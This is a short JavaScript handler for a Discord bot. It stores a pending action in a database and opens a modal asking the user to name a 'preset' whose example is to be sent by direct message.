const generate = require("../../../autosecure/utils/utils/generate")
const { queryParams } = require("../../../db/database")
const modalBuilder = require("../../../autosecure/utils/modalBuilder")
const { TextInputStyle } = require("discord.js")

module.exports = {
  name: "presetex",
  callback: async (client, interaction) => {
    let [t, userid, botnumber, page] = interaction.customId.split("|")
    let rId = generate(32)

    await queryParams(
      `INSERT INTO actions (id, action) VALUES (?, ?)`,
      [rId, `presetexmodal|${userid}|${botnumber}|${[page]}`]
    )

    await interaction.showModal(
      modalBuilder(`action|${rId}`, 'DM example of your preset.', [
        {
          setCustomId: 'presetname',
          setMaxLength: 21,
          setMinLength: 1,
          setRequired: true,
          setLabel: "Name of preset",
          setPlaceholder: "Ex: oauth",
          setStyle: TextInputStyle.Short
        }
      ])
    )
  }
}
